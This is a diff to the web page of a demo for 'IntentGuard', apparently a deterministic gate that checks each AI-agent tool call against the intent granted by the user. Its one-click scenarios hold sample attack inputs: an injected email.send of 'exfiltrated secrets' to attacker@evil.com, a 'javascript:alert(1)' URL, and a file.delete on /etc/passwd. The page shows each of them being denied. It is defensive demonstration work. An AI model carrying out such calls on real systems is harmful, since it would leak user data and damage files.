@@ -27,8 +27,9 @@
   .panel h2 { margin:0 0 4px; font-size:14px; }
   .panel .sub { color:var(--muted); font-size:12px; margin-bottom:14px; }
   label { display:block; color:var(--muted); font-size:12px; margin:10px 0 4px; }
-  input, select { width:100%; background:var(--bg); color:var(--ink);
+  input, select, textarea { width:100%; background:var(--bg); color:var(--ink);
     border:1px solid var(--line); border-radius:8px; padding:8px 10px; font-size:13px; }
+  textarea { font-family:ui-monospace,SFMono-Regular,Menlo,monospace; min-height:76px; resize:vertical; }
   .row { display:grid; grid-template-columns:1fr 1fr auto; gap:8px; align-items:end; margin-bottom:8px; }
   .row .x { background:transparent; border:1px solid var(--line); color:var(--muted);
     border-radius:8px; padding:8px 10px; cursor:pointer; }
@@ -57,6 +58,41 @@
   .note { color:var(--muted); font-size:12px; margin-top:6px; }
   code { background:var(--bg); border:1px solid var(--line); border-radius:5px; padding:1px 5px; }
   .step { font-size:11px; color:var(--accent); font-weight:700; letter-spacing:.6px; }
+  /* how-to explainer */
+  .howto { grid-column:1 / -1; }
+  .howto ol { margin:8px 0 0; padding-left:20px; color:var(--muted); font-size:13px; }
+  .howto li { margin-bottom:6px; }
+  .howto b { color:var(--ink); }
+  /* decision pipeline */
+  .pipe { display:flex; gap:6px; flex-wrap:wrap; align-items:stretch; margin-top:12px; }
+  .gate { flex:1; min-width:120px; border:1px solid var(--line); border-radius:8px;
+    padding:8px 10px; font-size:11px; color:var(--muted); background:var(--panel); }
+  .gate b { display:block; font-size:12px; color:var(--ink); margin-bottom:2px; }
+  .gate.passed { border-color:var(--allow); opacity:.75; }
+  .gate.passed b::after { content:" ✓"; color:#5fe39a; }
+  .gate.fired-deny { border-color:var(--deny); background:rgba(214,59,59,.12); }
+  .gate.fired-deny b { color:#ff9a9a; }
+  .gate.fired-allow { border-color:var(--allow); background:rgba(31,157,87,.12); }
+  .gate.fired-allow b { color:#5fe39a; }
+  .gate.fired-escalate { border-color:var(--escalate); background:rgba(217,154,30,.12); }
+  .gate.fired-escalate b { color:#ffd27a; }
+  .gate.notreached { opacity:.4; }
+  .explain { margin-top:10px; font-size:12px; color:var(--muted); border-left:3px solid var(--accent);
+    padding:6px 10px; background:rgba(91,140,255,.06); border-radius:0 8px 8px 0; }
+  .explain b { color:var(--ink); }
+  /* constraints box */
+  .constraints { margin-top:8px; font-size:12px; color:var(--muted);
+    border:1px dashed var(--line); border-radius:8px; padding:8px 10px; }
+  .constraints b { color:var(--ink); font-weight:600; }
+  .constraints .c { display:block; margin-top:2px; }
+  /* scenarios */
+  .scenarios { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:10px; }
+  @media (max-width:880px){ .scenarios{ grid-template-columns:1fr; } }
+  .scenario { text-align:left; background:var(--bg); border:1px solid var(--line); color:var(--ink);
+    border-radius:8px; padding:8px 10px; cursor:pointer; font-size:12px; }
+  .scenario:hover { border-color:var(--accent); }
+  .scenario small { display:block; color:var(--muted); }
+  .err-detail { color:#ff9a9a; font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:11px; }
 </style>
 </head>
 <body>
@@ -73,6 +109,18 @@
 </header>
 
 <main>
+  <!-- 0. HOW TO USE -->
+  <section class="panel howto">
+    <h2>How this demo works</h2>
+    <div class="sub">IntentGuard decides, per tool call, whether an AI agent's action is inside what the user actually asked for. A prompt injection can change what the agent <i>wants</i> to do — never what it is <i>allowed</i> to do.</div>
+    <ol>
+      <li><b>Provision intent (trusted, once).</b> In panel 1, declare which <code>tool → resource</code> pairs the user's request authorizes, then click <b>Provision session</b>. In a real deployment this comes from parsing the user's request — before any untrusted content is read.</li>
+      <li><b>Attempt tool calls (untrusted, per call).</b> In panel 2, pick a tool and edit its arguments as JSON — or click a one-click scenario. Each call runs through the decision pipeline shown with the verdict: three deterministic gates (<code>allowlist → argument&nbsp;shape → resource&nbsp;binding</code>) and then the intent check against the policy store. No LLM is consulted; every deny fails closed.</li>
+      <li><b>Read the audit log.</b> Panel 3 shows every decision, append-only, with the machine-readable reason, the specific argument violation when there is one, and OWASP Agentic Top&nbsp;10 threat tags. Flip <b>observe/enforce</b> (top right) to see observe mode allow everything while recording what enforce <i>would have</i> denied.</li>
+    </ol>
+    <div class="note">💡 New: <b>argument-level validation</b>. Each registry tool can declare per-argument shape constraints (type, enum, regex pattern, max length). A call violating one is denied <code>invalid_arguments</code> before the policy store is even consulted — the selected tool's constraints are shown in panel 2.</div>
+  </section>
+
   <!-- 1. PROVISION -->
   <section class="panel">
     <div class="step">TRUSTED PATH · ONCE, UP FRONT</div>
@@ -88,32 +136,34 @@
     <div id="actions"></div>
     <button class="act ghost" id="addAction">+ add action</button>
     <button class="act" id="provision">Provision session ✓</button>
-    <div class="note" id="provNote"></div>
+    <div class="note" id="provNote">Not provisioned yet — calls will be denied <code>no_session</code>.</div>
   </section>
 
   <!-- 2. ATTEMPT -->
   <section class="panel">
     <div class="step">UNTRUSTED PATH · PER TOOL CALL</div>
     <h2>2 · Agent attempts a tool call</h2>
-    <div class="sub">Each call is checked against the frozen intent. No LLM — a deterministic yes/no.</div>
+    <div class="sub">Each call is checked against the frozen intent. No LLM — a deterministic verdict.</div>
 
     <label>Tool</label>
-    <select id="tool">
-      <option value="email.send">email.send</option>
-      <option value="calendar.read">calendar.read</option>
-      <option value="file.write">file.write</option>
-      <option value="http.get">http.get</option>
-    </select>
-    <label id="argLabel">Recipient (to)</label>
-    <input id="argValue" value="bob@example.com" />
+    <select id="tool"></select>
+
+    <div class="constraints" id="constraints">Loading tool registry…</div>
+
+    <label>Arguments <span class="pill">JSON — edit freely to trigger shape violations</span></label>
+    <textarea id="argJson" spellcheck="false">{"to": "bob@example.com"}</textarea>
 
     <div class="btnrow">
       <button class="act" id="send">Attempt call →</button>
-      <button class="act danger" id="inject">⚠️ Simulate injection → attacker@evil.com</button>
     </div>
+
+    <label>One-click scenarios <span class="pill">each demonstrates one decision reason</span></label>
+    <div class="scenarios" id="scenarios"></div>
 
     <div class="verdict" id="verdict">
       <span class="badge" id="badge"></span>
+      <div class="pipe" id="pipe"></div>
+      <div class="explain" id="explain"></div>
       <div class="kv" id="verdictKv"></div>
     </div>
   </section>
@@ -121,18 +171,70 @@
   <!-- 3. AUDIT -->
   <section class="panel" style="grid-column:1 / -1">
     <h2>3 · Append-only audit log</h2>
-    <div class="sub">Every decision, immutable, tagged to OWASP Agentic Top 10 threats. This is your security telemetry.</div>
+    <div class="sub">Every decision, immutable, tagged to OWASP Agentic Top 10 threats. The <b>detail</b> column carries the specific argument violation (e.g. <code>pattern_mismatch:url</code>) or the fail-closed error.</div>
     <table>
-      <thead><tr><th>decision</th><th>tool → resource</th><th>reason</th><th>mode</th><th>would-have</th><th>OWASP threats</th></tr></thead>
-      <tbody id="audit"><tr><td colspan="6" class="note">No decisions yet — provision a session, then attempt a call.</td></tr></tbody>
+      <thead><tr><th>decision</th><th>tool → resource</th><th>reason</th><th>detail</th><th>mode</th><th>would-have</th><th>OWASP threats</th></tr></thead>
+      <tbody id="audit"><tr><td colspan="7" class="note">No decisions yet — provision a session, then attempt a call.</td></tr></tbody>
     </table>
   </section>
 </main>
 
 <script>
-const ARG_KEYS = { "email.send":"to", "calendar.read":null, "file.write":"path", "http.get":"url" };
-const ARG_LABELS = { "to":"Recipient (to)", "path":"Path", "url":"URL" };
 let mode = "observe";
+let REGISTRY = [];          // [{name, description, resource_args|resource_arg, arguments:[ArgSpec]}]
+
+// Sensible starting arguments per bundled tool.
+const ARG_PRESETS = {
+  "email.send":      {to:"bob@example.com", subject:"Weekly notes", body:"Hi Bob — notes attached."},
+  "calendar.read":   {},
+  "calendar.create": {calendar:"work"},
+  "http.get":        {url:"https://example.com/data"},
+  "file.read":       {path:"/tmp/notes.txt"},
+  "file.write":      {path:"/tmp/notes.txt", content:"hello"},
+};
+
+// Plain-language explanation for every decision reason.
+const REASON_EXPLAIN = {
+  in_intent: "<b>Allowed.</b> This exact tool → resource pair was granted when the session was provisioned from the user's trusted request.",
+  not_in_intent: "<b>Denied: outside the user's intent.</b> The session exists, but this tool → resource was never granted. This is the injection defense: corrupted instructions can't expand what the agent may do.",
+  no_session: "<b>Denied: no session.</b> Nothing has been provisioned for this session id + subject. Use panel 1 first.",
+  unknown_tool: "<b>Denied at the allowlist gate.</b> The tool isn't in the registry, so it can't be authorized at all — no store lookup happens.",
+  invalid_arguments: "<b>Denied at the argument-shape gate.</b> An argument violates the tool's declared constraints (type / enum / pattern / max length) — see the detail below. Checked deterministically before the policy store is consulted.",
+  missing_resource: "<b>Denied at the resource-binding gate.</b> The argument carrying the security-relevant resource is missing or blank, so the call can't be bound to any specific grant. IntentGuard fails closed rather than let it match an \"any\" grant.",
+  pdp_error_failclosed: "<b>Denied fail-closed.</b> The policy store errored or timed out. In enforce mode the engine never fails open.",
+  escalated_for_review: "<b>Escalated.</b> Outside the granted intent, but this tool is configured as escalatable — a human is asked to approve instead of a hard deny.",
+};
+
+// Which pipeline gate each reason fires at (index into GATES; 3 = store check).
+const GATES = [
+  {name:"1 · Allowlist", desc:"tool in registry?"},
+  {name:"2 · Argument shape", desc:"types, enums, patterns, lengths"},
+  {name:"3 · Resource binding", desc:"resource argument present?"},
+  {name:"4 · Intent check", desc:"granted in policy store?"},
+];
+const REASON_GATE = {
+  unknown_tool:0, invalid_arguments:1, missing_resource:2,
+  in_intent:3, not_in_intent:3, no_session:3, pdp_error_failclosed:3, escalated_for_review:3,
+};
+
+// One-click scenarios: each triggers one decision reason (with the default
+// provisioned intent: email.send → bob@example.com, calendar.read → any).
+const SCENARIOS = [
+  {title:"✅ In intent", sub:"email.send to bob — granted at provisioning → ALLOW",
+   tool:"email.send", args:{to:"bob@example.com", subject:"Weekly notes"}},
+  {title:"⚠️ Prompt injection", sub:"same tool, attacker's recipient → DENY not_in_intent",
+   tool:"email.send", args:{to:"attacker@evil.com", body:"exfiltrated secrets"}},
+  {title:"🧪 Bad URL scheme", sub:"url must match https?:// → DENY invalid_arguments (pattern_mismatch:url)",
+   tool:"http.get", args:{url:"javascript:alert(1)"}},
+  {title:"🧪 Wrong argument type", sub:"path must be a string → DENY invalid_arguments (wrong_type:path)",
+   tool:"file.write", args:{path:42, content:"x"}},
+  {title:"🧪 Recipient not email-shaped", sub:"to must match an email pattern → DENY invalid_arguments (pattern_mismatch:to)",
+   tool:"email.send", args:{to:"not-an-email"}},
+  {title:"❓ Unknown tool", sub:"file.delete isn't in the registry → DENY unknown_tool",
+   tool:"file.delete", args:{path:"/etc/passwd"}},
+  {title:"🕳 Missing resource", sub:"no recipient: can't bind to a grant → DENY missing_resource",
+   tool:"email.send", args:{subject:"no recipient"}},
+];
 
 // --- mode toggle ---
 document.querySelectorAll("#modeSwitch button").forEach(b => b.onclick = () => {
@@ -140,13 +242,53 @@ document.querySelectorAll("#modeSwitch button").forEach(b => b.onclick = () => {
   document.querySelectorAll("#modeSwitch button").forEach(x => x.classList.toggle("on", x===b));
 });
 
+// --- registry: populate tool select + constraints box ---
+function resourceArgsOf(spec){
+  if (Array.isArray(spec.resource_args)) return spec.resource_args;
+  return spec.resource_arg ? [spec.resource_arg] : [];
+}
+function constraintText(a){
+  const parts = [];
+  if (a.type) parts.push(a.type);
+  if (a.required) parts.push("required");
+  if (a.enum) parts.push("one of " + JSON.stringify(a.enum));
+  if (a.pattern) parts.push("pattern " + a.pattern);
+  if (a.max_length != null) parts.push("≤" + a.max_length + " chars");
+  return parts.join(" · ") || "no constraints";
+}
+function renderConstraints(){
+  const spec = REGISTRY.find(t => t.name === toolEl.value);
+  const el = document.getElementById("constraints");
+  if (!spec){ el.innerHTML = "This tool is <b>not in the registry</b> — the allowlist gate will deny it (<code>unknown_tool</code>)."; return; }
+  const res = resourceArgsOf(spec);
+  let html = `<b>${spec.name}</b> — ${spec.description || "no description"}<span class="c">🔑 resource argument: ${res.length ? res.map(r=>`<code>${r}</code>`).join(" + ") : "<i>none (binds to any resource)</i>"}${res.length ? " — must be present, or the call is denied <code>missing_resource</code>" : ""}</span>`;
+  const args = spec.arguments || [];
+  if (args.length){
+    html += `<span class="c">📐 declared argument constraints (violations are denied <code>invalid_arguments</code>):</span>`;
+    for (const a of args) html += `<span class="c">&nbsp;&nbsp;<code>${a.name}</code>: ${constraintText(a)}</span>`;
+  } else {
+    html += `<span class="c">📐 no argument constraints declared — any argument shapes are accepted.</span>`;
+  }
+  html += `<span class="c">✏️ undeclared arguments are never rejected — add anything to the JSON below.</span>`;
+  el.innerHTML = html;
+}
+async function loadRegistry(){
+  const r = await fetch("/demo/registry");
+  REGISTRY = (await r.json()).tools || [];
+  toolEl.innerHTML = REGISTRY.map(t=>`<option>${t.name}</option>`).join("")
+    + `<option value="file.delete">file.delete (not in registry)</option>`;
+  renderConstraints();
+  setArgsFor(toolEl.value);
+}
+
 // --- provisioning action rows ---
 const actionsEl = document.getElementById("actions");
 function addRow(tool="email.send", resource="bob@example.com") {
   const div = document.createElement("div");
   div.className = "row";
+  const opts = (REGISTRY.length ? REGISTRY.map(t=>t.name) : Object.keys(ARG_PRESETS));
   div.innerHTML = `
-    <select class="t">${Object.keys(ARG_KEYS).map(t=>`<option ${t===tool?"selected":""}>${t}</option>`).join("")}</select>
+    <select class="t">${opts.map(t=>`<option ${t===tool?"selected":""}>${t}</option>`).join("")}</select>
     <input class="r" placeholder="resource (blank = any)" value="${resource}" />
     <button class="x">✕</button>`;
   div.querySelector(".x").onclick = () => div.remove();
@@ -156,14 +298,28 @@ addRow("email.send","bob@example.com");
 addRow("calendar.read","");
 document.getElementById("addAction").onclick = () => addRow();
 
-// --- tool select updates the argument label ---
+// --- tool select updates constraints + argument preset ---
 const toolEl = document.getElementById("tool");
-toolEl.onchange = () => {
-  const key = ARG_KEYS[toolEl.value];
-  document.getElementById("argLabel").textContent = key ? ARG_LABELS[key] : "(no arguments)";
-  document.getElementById("argValue").disabled = !key;
-  document.getElementById("argValue").value = key ? document.getElementById("argValue").value : "";
-};
+function setArgsFor(tool){
+  document.getElementById("argJson").value =
+    JSON.stringify(ARG_PRESETS[tool] ?? {}, null, 0).replace(/,"/g, ', "').replace(/^{"/, '{ "').replace(/}$/, ' }').replace(/^{ }$/, "{}");
+}
+toolEl.onchange = () => { renderConstraints(); setArgsFor(toolEl.value); };
+
+// --- scenarios ---
+const scenEl = document.getElementById("scenarios");
+for (const s of SCENARIOS){
+  const b = document.createElement("button");
+  b.className = "scenario";
+  b.innerHTML = `${s.title}<small>${s.sub}</small>`;
+  b.onclick = () => {
+    if ([...toolEl.options].some(o => o.value === s.tool || o.text === s.tool)) toolEl.value = s.tool;
+    document.getElementById("argJson").value = JSON.stringify(s.args);
+    renderConstraints();
+    decide(s.tool, s.args);
+  };
+  scenEl.appendChild(b);
+}
 
 async function provision() {
   const allowed_actions = [...actionsEl.querySelectorAll(".row")].map(row => ({
@@ -177,12 +333,10 @@ async function provision() {
   };
   const r = await fetch("/v1/sessions", {method:"POST", headers:{"content-type":"application/json"}, body:JSON.stringify(body)});
   const j = await r.json();
-  document.getElementById("provNote").textContent = `✔ provisioned ${j.grants_written} grants for ${body.subject}`;
+  document.getElementById("provNote").textContent = `✔ provisioned ${j.grants_written} grants for ${body.subject} — intent is now frozen for this session`;
 }
 
-async function decide(tool, value) {
-  const key = ARG_KEYS[tool];
-  const args = key ? { [key]: value } : {};
+async function decide(tool, args) {
   const body = {
     session_id: document.getElementById("session").value,
     subject: document.getElementById("subject").value,
@@ -190,14 +344,34 @@ async function decide(tool, value) {
   };
   const r = await fetch("/v1/decide", {method:"POST", headers:{"content-type":"application/json"}, body:JSON.stringify(body)});
   const v = await r.json();
-  showVerdict(v);
-  await refreshAudit();
+  const detail = await refreshAudit(v.decision_id);
+  showVerdict(v, detail);
 }
 
-function showVerdict(v) {
+function renderPipe(reason, decision){
+  const fired = REASON_GATE[reason] ?? 3;
+  return GATES.map((g, i) => {
+    let cls = "gate";
+    if (i < fired) cls += " passed";
+    else if (i === fired) cls += " fired-" + decision;
+    else cls += " notreached";
+    return `<div class="${cls}"><b>${g.name}</b>${g.desc}</div>`;
+  }).join("");
+}
+
+function showVerdict(v, detail) {
   const badge = document.getElementById("badge");
   badge.className = "badge " + v.decision;
   badge.textContent = v.decision.toUpperCase();
+  // In observe mode the pipeline shows what enforce WOULD have decided.
+  const effective = v.would_have_decided || v.decision;
+  document.getElementById("pipe").innerHTML = renderPipe(v.reason, effective);
+  let explain = REASON_EXPLAIN[v.reason] || "";
+  if (v.would_have_decided && v.would_have_decided !== "allow")
+    explain += ` <br>👁 <b>Observe mode:</b> the call was allowed through, but the pipeline above shows what enforce mode would have done — flip the switch (top right) to enforce it.`;
+  if (detail && detail !== "—")
+    explain += ` <br>🔎 violation detail: <span class="err-detail">${detail}</span>`;
+  document.getElementById("explain").innerHTML = explain;
   let kv = `reason <b>${v.reason}</b> &nbsp;·&nbsp; effective mode <b>${v.effective_mode}</b>`;
   if (v.would_have_decided) kv += ` &nbsp;·&nbsp; would have <b>${v.would_have_decided}</b>`;
   if (v.escalation_prompt) kv += `<br><br>🧑 <b>${v.escalation_prompt}</b>`;
@@ -206,25 +380,37 @@ function showVerdict(v) {
   document.getElementById("verdict").classList.add("show");
 }
 
-async function refreshAudit() {
+async function refreshAudit(findDecisionId) {
   const r = await fetch("/v1/audit?limit=50");
   const j = await r.json();
-  const rows = j.entries.slice().reverse().map(e => `
+  let detail = "—";
+  const rows = j.entries.slice().reverse().map(e => {
+    if (findDecisionId && e.decision_id === findDecisionId && e.error) detail = e.error;
+    return `
     <tr>
       <td class="dec ${e.decision}">${e.decision.toUpperCase()}</td>
       <td><code>${e.tool}</code> → ${e.resource}</td>
       <td>${e.reason}</td>
+      <td>${e.error ? `<span class="err-detail">${e.error}</span>` : "—"}</td>
       <td>${e.effective_mode}</td>
       <td>${e.would_have_decided ?? "—"}</td>
       <td class="threats">${(e.owasp_threats||[]).join("<br>") || "—"}</td>
-    </tr>`).join("");
+    </tr>`;
+  }).join("");
   document.getElementById("audit").innerHTML = rows ||
-    `<tr><td colspan="6" class="note">No decisions yet.</td></tr>`;
+    `<tr><td colspan="7" class="note">No decisions yet.</td></tr>`;
+  return detail;
 }
 
 document.getElementById("provision").onclick = provision;
-document.getElementById("send").onclick = () => decide(toolEl.value, document.getElementById("argValue").value);
-document.getElementById("inject").onclick = () => decide("email.send", "attacker@evil.com");
+document.getElementById("send").onclick = () => {
+  let args;
+  try { args = JSON.parse(document.getElementById("argJson").value || "{}"); }
+  catch (e) { alert("Arguments must be valid JSON: " + e.message); return; }
+  decide(toolEl.value, args);
+};
+
+loadRegistry();
 refreshAudit();
 </script>
 </body>
